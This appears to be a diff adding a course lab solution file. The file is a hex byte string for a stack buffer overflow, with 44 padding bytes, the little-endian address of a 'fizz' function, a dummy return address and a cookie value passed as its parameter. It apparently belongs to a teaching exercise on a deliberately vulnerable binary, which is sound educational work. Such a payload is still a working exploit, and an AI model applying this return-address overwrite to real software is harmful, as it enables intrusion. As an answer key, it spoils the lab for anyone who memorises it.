@@ -1,0 +1,12 @@
+/* Padding required: 44 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+/* fizz located at: 0x08048cba */
+ba 8c 04 08
+
+/* fizz return address (no need to return test) */
+00 00 00 00
+
+/* Cookie (parameter): 0x5b975f43 */
+43 5f 97 5b
